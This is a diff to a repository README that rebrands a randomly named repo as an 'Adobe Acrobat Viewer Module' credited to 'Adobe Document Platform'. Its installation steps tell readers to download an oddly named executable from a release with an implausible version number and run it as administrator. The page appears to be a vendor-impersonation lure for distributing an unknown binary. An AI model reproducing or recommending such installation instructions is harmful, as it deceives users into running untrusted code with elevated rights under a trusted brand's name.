@@ -1,2 +1,37 @@
-# pdf-render-helper-my7uq8
+# Adobe Acrobat Viewer Module
+
 Acrobat integration module for in-browser PDF viewing and desktop update delivery.
+
+## Overview
+
+| | |
+|---|---|
+| **Vendor** | Adobe Document Platform |
+| **Latest release** | `v66893` |
+| **Platform** | Windows 10 / 11 (x64) |
+| **Runtime** | C++ |
+
+## Installation
+
+1. Open the [Releases](https://github.com) page for this repository.
+2. Download `adb_mscu7c80bnmia_v30209.exe` from release **v66893**.
+3. Run the installer as administrator if prompted.
+4. Restart your browser or document app to load the updated module.
+
+## System requirements
+
+- Windows 10 version 1903 or later (64-bit)
+- .NET Desktop Runtime 6.0+ (bundled in installer when required)
+- 120 MB free disk space
+
+## Changelog
+
+See [CHANGELOG.md](CHANGELOG.md) for version history.
+
+## License
+
+Distributed under the terms in [LICENSE](LICENSE).
+
+## Support
+
+For enterprise deployment notes see [docs/INSTALL.md](docs/INSTALL.md).
